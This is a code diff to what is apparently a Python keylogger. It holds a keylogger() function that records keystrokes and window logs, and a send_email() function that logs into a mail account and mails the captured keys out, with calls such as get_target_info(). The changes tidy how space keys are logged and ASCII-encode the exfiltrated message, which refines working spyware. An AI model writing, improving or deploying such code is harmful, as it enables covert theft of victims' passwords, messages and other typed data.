@@ -91,13 +91,19 @@ def keylogger():
             try:
                 if 'Key.' in str(key.char):
                     sub = str(key.char).split('Key.')[1]
-                    keys_pressed.append(f' [{sub}] ')
+                    if sub != 'space':
+                        keys_pressed.append(f' [{sub}] ')
+                    else:
+                        keys_pressed.append(f' ')
                 else:
                     keys_pressed.append(str(key.char))
             except AttributeError:
                 if 'Key.' in str(key):
                     sub = str(key).split('Key.')[1]
-                    keys_pressed.append(f' [{sub}] ')
+                    if sub != 'space':
+                        keys_pressed.append(f' [{sub}] ')
+                    else:
+                        keys_pressed.append(f' ')
                 else:
                     keys_pressed.append(str(key))
 
@@ -150,7 +156,8 @@ def send_email():
         email = my_email
         password = my_pass
         server.login(email, password)
-        server.sendmail(email, email, str(email_message))
+        server.sendmail(email, email, str(
+            email_message).encode("ascii", "ignore"))
         window_log = []
         keys_pressed = []
     get_target_info()
